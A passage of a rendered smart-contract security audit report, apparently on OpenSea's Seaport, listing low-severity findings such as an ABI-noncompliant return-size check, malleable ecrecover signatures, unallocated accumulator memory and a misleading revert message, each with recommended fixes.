class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Only put result on stack if return data is exactly one word.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">returndatasize</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">OneWord</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>This is not compliant with the ABI standard, as the ABI standard allows for returning more data than needed. The proper one should <code>if iszero(lt(returndatasize(), OneWord))</code>.</p>\n<p>This is currently used in </p>\n<ol>\n<li><code>_assertValidEIP1271Signature</code>: to check the returnvalue <code>bytes4 magicValue</code> of <code>isValidSignature</code>.</li>\n<li><code>_assertIsValidOrderStaticcallSuccess</code> for checking <code>ZoneInterface</code> returnvalue.</li>\n</ol>\n<p>The ABI standard allows for extra data everywhere. That is, given a correct 32-byte value, having more data at the end is valid. Therefore, this function returns <code>false</code> for complaint contracts.</p>\n<p>However, most contracts wouldn’t return more than 32-bytes when only 32-bytes are needed. A notable exception is some versions of proxy contracts in Vyper. This proxy always returned 128 bytes, with any extra data padded with zeros (<a href=\"https://github.com/vyperlang/vyper/blob/069936fa3fee8646ff362145593128d7ef07da38/vyper/functions/functions.py#L1471\">source</a>). This has caused issues with SolMate’s <code>SafeTransferLib</code>, leading to DOS issues on chain (<a href=\"https://github.com/Rari-Capital/solmate/issues/141\">source</a>).</p>\n<p>This is at least a low severity issue, and may even be considered Medium if there are known EIP1271 wallets in existence with the aforementioned issue. Note: for ERC20 tokens, there are known tokens with the problem (certain Curve tokens). Considering that this is a trivial fix, it’s better to be on the side of caution and make the above change.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>For a simple proof of concept, consider a minimal proxy contract that does <code>return(0, 0x1000)</code> (instead of the usual <code>return(0, returndatasize())</code>) where the ‘implementation’ is a EIP1271 wallet contract. The low level helper would revert when verifying the <code>_assertValidEIP1271Signature</code>, whereas a high level solidity implementation would succeed.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the strict equality check to a <code>>=</code> check.</p>\n<h2 id=\"11-_assertvalidsignature-allows-malleable-secp256k1-signatures\" style=\"position:relative;\"><a href=\"#11-_assertvalidsignature-allows-malleable-secp256k1-signatures\" aria-label=\"11 _assertvalidsignature allows malleable secp256k1 signatures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] <code>_assertValidSignature</code> allows malleable <code>secp256k1</code> signatures</h2>\n<p>The <code>ecrecover()</code> call <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/SignatureVerification.sol#L91\">here</a> does not verify <code>0 &#x3C; s &#x3C; secp256k1.n ÷ 2 + 1</code>.</p>\n<p>This restriction was introduced Homestead (<a href=\"https://eips.ethereum.org/EIPS/eip-2\">EIP-2</a>), but left the precompile unchanged. Most libraries, such as OpenZeppelin, <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.6.0/contracts/utils/cryptography/ECDSA.sol#L152-L166\">perform this check</a>.</p>\n<p>There does not seem to be an immediate risk in the current use cases, because an order can be verified only once and its hash is stored. These places are <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L48\"><code>_validateBasicOrderAndUpdateStatus</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L104\"><code>_validateOrderAndUpdateStatus</code></a> and <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L333\"><code>validate</code></a>.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/SignatureVerification.sol#L91\">SignatureVerification.sol#L91</a></p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Perform the check.</p>\n<h2 id=\"12-the-memory-cost-calculation-logic-_revertwithreasonifoneisreturned-is-duplicated-in-multiple-places\" style=\"position:relative;\"><a href=\"#12-the-memory-cost-calculation-logic-_revertwithreasonifoneisreturned-is-duplicated-in-multiple-places\" aria-label=\"12 the memory cost calculation logic _revertwithreasonifoneisreturned is duplicated in multiple places permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] The memory cost calculation logic <code>_revertWithReasonIfOneIsReturned</code> is duplicated in multiple places</h2>\n<p><code>_revertWithReasonIfOneIsReturned</code> implements a memory cost calculation logic. This is duplicated in four places: <code>_performERC20Transfer</code>, <code>_performERC721Transfer</code>, <code>_performERC1155Transfer</code>, <code>_performERC1155BatchTransfer</code>.</p>\n<p>Several slight issues were identified with this function and those may or may not be present in five places in total.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L46\">LowLevelHelper.sol#L46</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L79\">TokenTransferrer.sol#L79</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L259\">TokenTransferrer.sol#L259</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L393\">TokenTransferrer.sol#L393</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L639\">TokenTransferrer.sol#L639</a></p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Reduce code duplication and risk of differences between them.</p>\n<h2 id=\"13-accumulator-code-depends-on-memory-usage\" style=\"position:relative;\"><a href=\"#13-accumulator-code-depends-on-memory-usage\" aria-label=\"13 accumulator code depends on memory usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[13] Accumulator code depends on memory usage</h2>\n<p>The accumulator is used in <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L196\"><code>BasicOrderFulfiller</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderFulfiller.sol#L175\"><code>OrderFulfiller</code></a> and <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderCombiner.sol#L618\"><code>OrderCombiner</code></a>. It is a variable length array, but does not have a properly allocated memory space. It can be grown using <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L588\"><code>_insert</code></a> and <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L456\"><code>_trigger</code></a> will “flush” it.</p>\n<p>The problem is it is placed at the free memory pointer, but the pointer is not increment if it would grow beyond its initial capacity. The initial capacity is <code>AccumulatorDisarmed</code> aka 32. In the use cases it seems at most 2 entries are inserted.</p>\n<p>Instead of relying that this memory space is never overwritten, it may make sense pre-allocating a fixed structure. The current implementation can break on compiler upgrades or changes in the function layouts.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L196\"><code>BasicOrderFulfiller</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderFulfiller.sol#L175\"><code>OrderFulfiller</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderCombiner.sol#L618\"><code>OrderCombiner</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L588\"><code>_insert</code></a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L456\"><code>_trigger</code></a></p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Avoid using the non-memory allocating accumulator design.</p>\n<h2 id=\"14-doing-a-basic-order-twice-gives-a-misleading-error-message\" style=\"position:relative;\"><a href=\"#14-doing-a-basic-order-twice-gives-a-misleading-error-message\" aria-label=\"14 doing a basic order twice gives a misleading error message permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[14] Doing a basic order twice gives a misleading error message</h2>\n<p>When doing a basic order twice a misleading error message is given: <code>OrderPartiallyFilled()</code>.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong>  <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L48-L74\">OrderValidator.sol#L48-L74</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L102-L139\">Verifiers.sol#L102-L139</a></p>\n<p>When doing a basic order, the function <code>_validateBasicOrderAndUpdateStatus()</code> is called, which uses <code>_verifyOrderStatus()</code> to verify the order hasn’t been used before. After this function it sets <code>_orderStatus[orderHash].numerator = 1;</code> to indicate the <code>orderHash</code> has been used.\nWhen trying to reuse the same order, <code>_verifyOrderStatus()</code> correctly <code>revert</code>s. However it uses the <code>revert</code> message <code>OrderPartiallyFilled()</code> which is not correct because the order has been fully filled before.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OrderValidator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Executor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ZoneInteraction</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateBasicOrderAndUpdateStatus</span><span class=\"mtk1\">( ... ) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_verifyOrderStatus</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">orderStatus</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// Only allow unused orders when fulfilling basic orders.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// Signifies to revert if the order is invalid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_orderStatus</span><span class=\"mtk1\">[</span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">].</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Verifiers</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Assertions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">SignatureVerification</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_verifyOrderStatus</span><span class=\"mtk1\">(..., </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onlyAllowUnused</span><span class=\"mtk1\">, ... ) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">orderStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {  </span><span class=\"mtk3\">// the second time numerator == 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">onlyAllowUnused</span><span class=\"mtk1\">) {   </span><span class=\"mtk3\">// true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OrderPartiallyFilled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// misleading message</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OrderPartiallyFilled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider giving a different error message in <code>_verifyOrderStatus()</code> when a basic order is executed twice.</p>\n<h2 id=\"15-orders-with-moving-price-and-endtime--typeuintmax-can-never-be-fulfilled\" style=\"position:relative;\"><a href=\"#15-orders-with-moving-price-and-endtime--typeuintmax-can-never-be-fulfilled\" aria-label=\"15 orders with moving price and endtime  typeuintmax can never be fulfilled permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[15] Orders with moving price and <code>endTime = type(uint).max</code> can never be fulfilled</h2>\n<p>It is quite realistic that many users will use <code>type(uint).max</code> as <code>infinity</code> when setting the <code>endTime</code> of their orders so that it stays open indefinitely. However the math <code>(startAmount * remaining) + (endAmount * elapsed) + extraCeiling</code> in <a 